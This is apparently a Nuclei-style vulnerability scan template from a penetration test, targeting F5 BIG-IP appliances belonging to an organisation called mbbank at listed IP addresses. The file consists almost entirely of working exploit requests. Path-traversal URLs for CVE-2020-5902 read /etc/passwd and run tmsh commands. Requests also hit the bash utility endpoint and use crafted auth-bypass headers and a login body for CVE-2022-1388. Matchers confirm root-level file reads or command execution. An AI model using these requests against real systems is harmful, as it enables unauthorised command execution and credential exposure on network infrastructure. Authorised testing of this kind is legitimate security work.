id: mbbank-f5-bigip-checks

info:
  name: F5 BIG-IP Security Checks — mbbank
  author: pentest-team
  severity: high
  description: |
    F5 BIG-IP detected via gogo fingerprint on multiple IPs (103.12.104.118,
    103.12.104.124, 103.12.104.161, 103.12.104.163, 103.12.104.189...).
    Tests for: CVE-2020-5902 (RCE), CVE-2021-22986 (auth bypass),
    CVE-2022-1388 (auth bypass iControl REST), management interface exposure.
  tags: f5,bigip,cve,rce,mbbank
  reference:
    - https://support.f5.com/csp/article/K52145254
    - https://nvd.nist.gov/vuln/detail/CVE-2020-5902
    - https://nvd.nist.gov/vuln/detail/CVE-2022-1388

http:
  - method: GET
    path:
      # CVE-2020-5902: TMUI RCE
      - "{{BaseURL}}/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd"
      - "{{BaseURL}}/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin"
      # Management interface exposure
      - "{{BaseURL}}/tmui/login.jsp"
      - "{{BaseURL}}/mgmt/tm/sys/version"
      # iControl REST (CVE-2022-1388)
      - "{{BaseURL}}/mgmt/shared/authn/login"
      - "{{BaseURL}}/mgmt/tm/util/bash"

    headers:
      # CVE-2022-1388 bypass header
      X-F5-Auth-Token: ""
      Authorization: "Basic YWRtaW46"

    matchers-condition: or
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
          - "uid=0\\(root\\)"
        name: rce-confirmed

      - type: word
        part: body
        words:
          - "BIG-IP"
          - "F5 Networks"
          - "TMUI"
        condition: or
        name: mgmt-exposed

      - type: status
        status: [200]
        name: icontrol-accessible

  - method: POST
    path:
      # CVE-2022-1388: iControl REST auth bypass
      - "{{BaseURL}}/mgmt/shared/authn/login"
    headers:
      Content-Type: "application/json"
      X-F5-Auth-Token: ""
      Connection: "X-F5-Auth-Token, X-Icontrol-TMOS-Auth-Token"
    body: '{"username":"admin","userReference":""}'

    matchers:
      - type: word
        part: body
        words:
          - "token"
          - "generation"
        condition: and
        name: cve-2022-1388-auth-bypass
